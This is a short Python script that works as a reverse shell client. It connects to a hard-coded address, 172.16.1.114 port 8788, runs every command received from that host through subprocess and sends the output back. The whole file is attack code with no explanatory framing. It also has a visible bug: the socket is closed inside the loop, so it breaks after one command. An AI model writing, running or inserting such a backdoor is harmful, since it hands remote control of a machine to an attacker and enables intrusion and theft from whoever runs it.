import socket
import subprocess

if __name__ == "__main__":
    serverAddress = "172.16.1.114"
    sevrerPort = 8788

    serverSocketAddress = (serverAddress, sevrerPort)
    targetSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    targetSocket.connect(serverSocketAddress)

    while True:
        command = targetSocket.recv(1024).decode()
        # print(f"Received command: {command}")
        if command.lower() == "exit":
            break
        response = subprocess.getoutput(command)
        targetSocket.send(response.encode())

        targetSocket.close()
